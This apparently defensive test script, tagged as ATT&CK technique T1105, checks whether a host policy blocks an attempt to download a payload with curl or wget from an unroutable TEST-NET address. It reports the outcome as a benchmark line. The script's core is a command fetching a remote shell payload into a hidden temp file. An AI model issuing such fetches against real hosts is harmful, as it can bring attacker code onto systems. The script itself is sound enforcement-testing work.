#!/usr/bin/env sh
# Tactic: Command and Control (TA0011)
# Technique: Ingress Tool Transfer (T1105)
# Attack: fetch a remote payload with curl/wget from an unbaselined host.
# Uses 198.51.100.11 (TEST-NET-2, unroutable) so nothing real is contacted.
# nginx never pulls executables from the internet at runtime.
# Marker: outcome=attempted (network path; judge blocking via tool logs, since
#         an unroutable destination fails regardless of enforcement).
set -u
TAG="22-remote-payload"
KIND="attack"
URL="http://198.51.100.11/payload.sh"
rc=0
if command -v curl >/dev/null 2>&1; then
  timeout 4 curl -s -m 3 -o /tmp/.payload "$URL" >/dev/null 2>&1 || rc=$?
  OUT="attempted"
elif command -v wget >/dev/null 2>&1; then
  timeout 4 wget -q -T 3 -O /tmp/.payload "$URL" >/dev/null 2>&1 || rc=$?
  OUT="attempted"
else
  OUT="skipped"
fi
rm -f /tmp/.payload 2>/dev/null || true
printf 'BENCH_RESULT tag=%s kind=%s outcome=%s rc=%s\n' "$TAG" "$KIND" "$OUT" "$rc"
